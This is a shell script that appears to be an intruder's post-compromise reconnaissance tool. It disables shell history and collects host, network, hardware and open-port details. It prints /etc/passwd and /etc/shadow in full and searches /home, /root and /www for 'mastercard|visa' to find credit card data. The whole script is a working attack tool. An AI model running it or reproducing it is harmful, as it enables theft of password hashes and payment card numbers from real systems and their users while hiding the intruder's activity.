#!/bin/sh
unset HISTFILE
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:/usr/local/bin
echo -----------------------------------------------------------------
echo "Network info:"
echo
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | \
awk -F ' ' ' {print $2} ' | cut -c6-`
echo "Trying to resolve the hostname...." >/dev/stderr
echo "Hostname : `hostname -f` ($MYIPADDR)"
echo "Alternative IP : `hostname -i`"
echo "Host : `hostname`"
if [ -f /etc/*-release ]; then
echo "Distro: `head -1 /etc/*-release`"
echo "Uname -a"
uname -a
echo "Uptime"
uptime
echo "Pwd"
pwd
echo "ID"
id
fi
echo -----------------------------------------------------------------
echo "Yahoo.com ping:"
echo
ping -c 6 216.115.108.243
echo -----------------------------------------------------------------
echo "Hw info:"
echo
echo "CPU Speed: `cat /proc/cpuinfo|grep MHz|awk -F ' ' ' {print $4} ' `MHz"
echo "CPU Vendor: `cat /proc/cpuinfo|grep vendor_id`"
echo "CPU Model: `cat /proc/cpuinfo|grep name`"
RAM=`free|grep Mem|awk -F ' ' ' {print $2} '`
if [ -x /usr/bin/dc ]; then
    echo "$RAM 1024 / 3 + p" >tmp
    echo "RAM: `/usr/bin/dc tmp` Mb"
    rm -f tmp
else
    echo "RAM: $RAM Kb"
fi
echo "HDD(s):"
df -h -T
echo -----------------------------------------------------------------
echo
echo "Ports open:"
if [ -x /usr/sbin/lsof ]; then 
    /usr/sbin/lsof|grep LISTEN
else
    /bin/netstat -a|grep LISTEN|grep tcp
    echo
    /bin/lnetstat -a|grep LISTEN|grep tcp
fi
echo -----------------------------------------------------------------
echo "/etc/passwd & /etc/shadow"
echo
echo "/etc/passwd"
cat /etc/passwd
echo
echo "/etc/shadow"
cat /etc/shadow
echo -----------------------------------------------------------------
echo "interesting filez:"
echo
locate *.mpg
locate *.mp3
locate *.avi
locate hack
locate openssl
echo
echo "Searching for ccz.. please wait (this can take several minutes)" >/dev/stderr
echo "Searching for ccz.."
echo
egrep -ir 'mastercard|visa' /home
egrep -ir 'mastercard|visa' /root
if [ -d /www ]; then
    egrep -ir 'mastercard|visa' /www
fi
echo "Done." >/dev/stderr
